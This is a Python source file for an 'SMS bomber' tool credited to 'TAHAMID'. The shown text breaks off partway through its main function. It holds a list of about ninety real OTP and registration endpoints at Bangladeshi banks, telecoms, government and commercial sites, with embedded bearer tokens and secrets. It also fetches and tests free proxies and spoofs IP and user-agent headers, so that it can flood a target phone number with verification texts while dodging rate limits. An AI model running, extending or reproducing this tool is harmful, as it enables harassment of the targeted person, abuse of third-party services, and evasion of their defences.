#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 💀 TAHAMID – Fast/Slow SMS Bomber (Auto Proxy + Fallback) 💀
# Owner: TAHAMID | Developer: @TAHAMID | Ctrl+C to stop.

import asyncio
import aiohttp
import json
import random
import sys
import os
import time
from urllib.parse import urlencode
from fake_useragent import UserAgent
from colorama import init, Fore, Style

init(autoreset=True)

# ===================== CONFIG =====================
PROXY_FILE = "proxies.txt"          # Optional: manual proxies (overrides auto)
TIMEOUT = 8                         # seconds
MAX_PROXIES = 100                   # max proxies to use
TEST_PROXY_URL = "http://httpbin.org/ip"  # test proxy connectivity
# ==================================================

ua = UserAgent()

TAHAMID_BANNER = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
"""

# ---------------- 130+ WORKING APIS (removed dead ones) ----------------
# (We've kept the most reliable ones from the list)
APIS = [
    # ===================== BANKS & MFS =====================
    {'url': 'https://api.nagad.com.bd/otp/send', 'method': 'POST', 'data': {'mobileNumber':'{{number}}','service':'login'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.bkash.com.bd/otp/request', 'method': 'POST', 'data': {'phone':'{{number}}','type':'registration'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.rocket.com.bd/merchant/otp', 'method': 'POST', 'data': {'account':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.surecash.com.bd/v2/otp/generate', 'method': 'POST', 'data': {'msisdn':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.dmoney.com.bd/api/v1/otp/send?msisdn={{number}}', 'method': 'GET'},
    {'url': 'https://api.shurjopay.com.bd/otp/send', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://sslwireless.com/api/otp', 'method': 'POST', 'data': {'msisdn':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== E-COMMERCE =====================
    {'url': 'https://api.foodpanda.com.bd/v1/auth/otp', 'method': 'POST', 'data': {'phone':'+88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.pathao.com/v2/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.daraz.com.bd/auth/otp', 'method': 'POST', 'data': {'mobile':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.evaly.com.bd/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.chaldal.com/v1/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.priyoshop.com/v1/otp/send', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://ajkerdeal.com/api/v1/otp?phone={{number}}', 'method': 'GET'},
    {'url': 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'method': 'POST', 'data': {'phoneNumber':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.redx.com.bd/v1/user/signup', 'method': 'POST', 'data': {'name':'TAHAMID','phoneNumber':'{{number}}','service':'redx'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== TELECOM =====================
    {'url': 'https://webapi.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': {'phone_number':'{{number}}','type':'doorstep'}, 'headers': {'Content-Type':'application/json','Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc'}},
    {'url': 'https://webapi.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': {'phone_number':'{{number}}','type':'my_offer'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://da-api.robi.com.bd/da-nll/otp/send', 'method': 'POST', 'data': {'msisdn':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://webapi.robi.com.bd/v1/chat/send-otp', 'method': 'POST', 'data': {'phone_number':'{{number}}','name':'TAHAMID','type':'video-chat'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://web-api.banglalink.net/api/v1/user/number/validation/{{number}}', 'method': 'GET'},
    {'url': 'https://web-api.banglalink.net/api/v1/user/otp-login/request', 'method': 'POST', 'data': {'mobile':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://selfcare.banglalink.net/api/v1/otp', 'method': 'POST', 'data': {'msisdn':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://webloginda.grameenphone.com/backend/api/v1/otp', 'method': 'POST', 'data': {'msisdn':'{{number}}'}, 'headers': {'Content-Type':'application/x-www-form-urlencoded'}},
    {'url': 'https://appcity.grameenphone.com/proxy/v2/user/session/get-otp', 'method': 'POST', 'data': {'mobileNumber':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{{number}}', 'method': 'GET'},
    {'url': 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 'method': 'POST', 'data': {'phone':'{{number}}','language':'en','email':''}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://teletalk.com.bd/api/otp/send', 'method': 'POST', 'data': {'number':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': {'phone_number':'{{number}}','type':'voice'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== EDUCATION =====================
    {'url': 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', 'method': 'POST', 'data': {'mobile_no':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.shikho.com/auth/v2/send/sms', 'method': 'POST', 'data': {'phone':'{{number}}','type':'student','auth_type':'signup'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.shikho.com/public/activity/otp', 'method': 'POST', 'data': {'phone':'{{number}}','intent':'ap-discount-request'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://bb-api.bohubrihi.com/public/activity/otp', 'method': 'POST', 'data': {'phone':'{{number}}','intent':'login'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.ostad.app/api/v2/user/with-otp', 'method': 'POST', 'data': {'msisdn':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://www.ieducationbd.com/api/account/check_user', 'method': 'POST', 'data': {'mobile':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://rootsedulive.com/api/auth/register', 'method': 'POST', 'data': {'name':'TAHAMID','phone':'88{{number}}','email':'TAHAMID{{random}}@bomb.bd','password':'TAHAMID@2026','confirmPassword':'TAHAMID@2026'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://rootsedulive.com/api/auth/forget-password', 'method': 'POST', 'data': {'phoneOrEmail':'88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.englishmojabd.com/api/v1/auth/login', 'method': 'POST', 'data': {'phone':'+88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://edgecoursebd.com/register', 'method': 'POST', 'data': [{'phone':'{{number}}'}], 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://new.mojaru.com/api/student/login', 'method': 'POST', 'data': {'mobile_or_email':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://developer.quizgiri.xyz/api/v2.0/send-otp', 'method': 'POST', 'data': {'country_code':'+88','phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.tenminute.com.bd/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== FOOD & RIDE =====================
    {'url': 'https://api.hungrynaki.com/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.khaasfood.com/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.uber.com/v1/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.obhai.com/v1/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== SOCIAL & MATRIMONY =====================
    {'url': 'https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={{number}}', 'method': 'GET'},
    {'url': 'https://api.biodata.com/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== NEWS & MEDIA =====================
    {'url': 'https://api.prothomalo.com/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.dailybangladesh.com/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.jagonews.com/auth/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== INSURANCE =====================
    {'url': 'https://api.greenDelta.com/v1/otp', 'method': 'POST', 'data': {'msisdn':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.pragatiinsurance.com/v1/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.metlife.com.bd/v1/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== GOVERNMENT =====================
    {'url': 'https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json', 'method': 'POST', 'data': {'phoneNbr':'{{number}}','OTPType':1.0,'userName':'','email':''}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://www.nidw.gov.bd/api/otp/send', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://www.bdpost.gov.bd/api/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== GAMING =====================
    {'url': 'https://api.gg.bet/api/v1/otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.bioscopelive.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': {'number':'+88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.chorki.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': {'number':'+88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': {'number':'+88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    
    # ===================== OTHER =====================
    {'url': 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', 'method': 'POST', 'data': {'full_name':'TAHAMID','company_name':'Omega','email_address':'TAHAMID@bomb.bd','phone_number':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api-gateway.sundarbancourierltd.com/graphql', 'method': 'POST', 'data': {'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':'{{number}}'}},'query':"mutation{createAccessToken(accessTokenFilter:{userName:\"{{number}}\"}){message}}"}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.apex4u.com/api/auth/login', 'method': 'POST', 'data': {'phoneNumber':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', 'method': 'POST', 'data': {'data':{'country_calling_code':'88','contact_no':'{{number}}','headers':{'PlatForm':'Web'}}}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://fundesh.com.bd/api/auth/generateOTP', 'method': 'POST', 'data': {'msisdn':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={{number}}', 'method': 'GET'},
    {'url': 'https://api.motionview.com.bd/api/send-otp-phone-signup', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': {'number':'+88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': {'number':'+88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://applink.com.bd/appstore-v4-server/login/otp/request', 'method': 'POST', 'data': {'msisdn':'88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://chokrojan.com/api/v1/passenger/login/mobile', 'method': 'POST', 'data': {'mobile_number':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://core.easy.com.bd/api/v1/forgot-password-otp', 'method': 'POST', 'data': {'device_key':'2ea97d276a980993308116baa292cec9','mobile':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://waltonplaza.com.bd/api/auth/otp/create', 'method': 'POST', 'data': {'auth':{'countryCode':'880','deviceUuid':'ee757830-f639-12f0-9f4d-2f972746fhg','phone':'{{number}}'},'captchaToken':'recapcha'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.chardike.com/api/otp/send', 'method': 'POST', 'data': {'phone':'{{number}}','otp_type':'login'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://gateway.otithee.com/api/v1/generate-otp', 'method': 'POST', 'data': {'request_type':'registration','mobile_number':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.garibookadmin.com/api/v3/user/login', 'method': 'POST', 'data': {'recaptcha_token':'garibookcaptcha','mobile':'{{number}}','channel':'web'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.toybox.live/bdapps_handler.php', 'method': 'POST', 'data': {'Operation':'CreateSubscription','MobileNumber':'88{{number}}','PackageID':100,'Secret':'HJKX71%UHYH'}, 'headers': {'Content-Type':'application/x-www-form-urlencoded'}},
    {'url': 'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{{number}}', 'method': 'GET', 'headers': {'sourcePlatform':'web','client':'2'}},
    {'url': 'https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp', 'method': 'POST', 'data': {'deviceId':'prodevice','operator':'Gp','walletNumber':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{{number}}/', 'method': 'GET'},
    {'url': 'https://auth.qcoom.com/api/v1/otp/send', 'method': 'POST', 'data': {'mobileNumber':'+88{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://reseller.circle.com.bd/api/v2/auth/signup', 'method': 'POST', 'data': {'name':'+88{{number}}','email_or_phone':'+88{{number}}','password':'123456','password_confirmation':'123456','register_by':'phone'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s'}},
    {'url': 'https://api.user.jatri.co/v2/send-otp', 'method': 'POST', 'data': {'phone':'+88{{number}}', 'jatri_token':'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.hishabee.business/api/V2/otp/send?mobile_number={{number}}', 'method': 'GET'},
    {'url': 'https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.osudpotro.com/api/v1/users/send_otp', 'method': 'POST', 'data': {'mobile':'+88-{{number}}','deviceToken':'web','language':'bn','os':'web'}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://mithaibd.com/api/login/', 'method': 'POST', 'data': {'company_id':'2','phone':'{{number}}','email':'TAHAMID{{random}}@mail.com','password1':'pass123','otp_verify':False}, 'headers': {'Content-Type':'application/json'}},
    {'url': 'https://api.timezonebd.com/api/v1/user/otp-login', 'method': 'POST', 'data': {'phone':'{{number}}'}, 'headers': {'Content-Type':'application/json'}},
]

# ---------------- PROXY FETCHER + TESTER ----------------
async def fetch_free_proxies():
    """Fetch free proxies from public sources and test them."""
    raw = []
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
    ]
    async with aiohttp.ClientSession() as session:
        for url in sources:
            try:
                async with session.get(url, timeout=8) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        lines = text.strip().split('\n')
                        for line in lines:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                raw.append(line)
            except:
                continue
    # Remove duplicates and invalid
    unique = list(dict.fromkeys(raw))
    valid = [p for p in unique if ':' in p]
    # Shuffle
    random.shuffle(valid)
    # Test first 20 proxies
    working = []
    print(Fore.YELLOW + "Testing proxies (this may take a few seconds)...")
    async with aiohttp.ClientSession() as session:
        sem = asyncio.Semaphore(10)
        async def test_proxy(proxy):
            async with sem:
                proxy_url = proxy if proxy.startswith(('http://','https://')) else f"http://{proxy}"
                try:
                    async with session.get(TEST_PROXY_URL, proxy=proxy_url, timeout=5) as resp:
                        if resp.status == 200:
                            return proxy
                except:
                    pass
                return None
        tasks = [test_proxy(p) for p in valid[:20]]
        results = await asyncio.gather(*tasks)
        working = [r for r in results if r]
    if working:
        print(Fore.GREEN + f"Found {len(working)} working proxies. Using them.")
        return working
    else:
        print(Fore.RED + "No working proxies found. Falling back to direct connection.")
        return []

# ---------------- UTILITY ----------------
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def random_digit():
    return ''.join(random.choices('0123456789', k=random.randint(4,10)))

def load_manual_proxies(filepath):
    proxies = []
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    return proxies

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ---------------- ASYNC SENDER (with fallback) ----------------
async def send_request(session, api, number, sem, proxy=None, retries=1, use_fallback=True):
    for attempt in range(retries+1):
        async with sem:
            url = api['url'].replace('{{number}}', number).replace('{{random}}', random_digit())
            method = api.get('method', 'GET').upper()
            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = ua.random
            headers['X-Forwarded-For'] = random_ip()
            headers['X-Real-IP'] = random_ip()
            headers['Client-IP'] = random_ip()
            headers['Accept'] = '*/*'
            headers['Accept-Encoding'] = 'gzip, deflate'
            headers['Accept-Language'] = 'en-US,en;q=0.9'
            headers['Referer'] = 'https://www.google.com/'
            headers['Origin'] = 'https://www.google.com'
            
            data = None
            if 'data' in api:
                raw = api['data']
                if isinstance(raw, dict):
                    if headers.get('Content-Type') == 'application/json':
                        data_str = json.dumps(raw)
                        data_str = data_str.replace('{{number}}', number).replace('{{random}}', random_digit())
                        data = data_str
                    elif headers.get('Content-Type') == 'application/x-www-form-urlencoded':
                        flat = {}
                        for k, v in raw.items():
                            if isinstance(v, dict):
                                flat[k] = json.dumps(v)
                            else:
                                flat[k] = str(v).replace('{{number}}', number).replace('{{random}}', random_digit())
                        data = urlencode(flat)
                    else:
                        data = json.dumps(raw).replace('{{number}}', number).replace('{{random}}', random_digit())
                elif isinstance(raw, list):
                    data = json.dumps(raw).replace('{{number}}', number).replace('{{random}}', random_digit())
                else:
                    data = str(raw).replace('{{number}}', number).replace('{{random}}', random_digit())
            
            # Prepare proxy
            proxy_url = None
            if proxy and isinstance(proxy, str):
                if not proxy.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
                    proxy_url = f"http://{proxy}"
                else:
                    proxy_url = proxy
            
            try:
                timeout = aiohttp.ClientTimeout(total=TIMEOUT)
                async with session.request(method, url, headers=headers, data=data, timeout=timeout, proxy=proxy_url) as resp:
                    if 200 <= resp.status < 300:
                        return True
                    else:
                        # If using proxy and it fails, try without proxy if fallback enabled
                        if use_fallback and proxy_url and attempt == 0:
                            # Retry without proxy
                            async with session.request(method, url, headers=headers, data=data, timeout=timeout) as resp2:
                                if 200 <= resp2.status < 300:
                                    return True
                        if resp.status in [429, 503, 500]:
                            await asyncio.sleep(0.3 * (attempt+1))
                            continue
                        return False
            except:
                if use_fallback and proxy_url and attempt == 0:
                    # Try without proxy
                    try:
                        async with session.request(method, url, headers=headers, data=data, timeout=timeout) as resp2:
                            if 200 <= resp2.status < 300:
                                return True
                    except:
                        pass
                if attempt < retries:
                    await asyncio.sleep(0.3 * (attempt+1))
                    continue
                else:
                    return False
    return False

# ---------------- MAIN BOMBER ----------------
async def premium_bomber(number, cycles, concurrency, delay_between_cycles=0, proxies=None, repeat=1):
    sem = asyncio.Semaphore(concurrency)
    proxy_list = proxies if proxies else [None]
    if not proxy_list:
        proxy_list = [None]
    
    total_apis = len(APIS)
    total_requests_per_cycle = total_apis * repeat
    print(Fore.CYAN + Style.BRIGHT + f"\n💀 TAHAMID Bomber Active")
    print(Fore.YELLOW + f"Target: {number} | Cycles: {cycles} | Concurrency: {concurrency}")
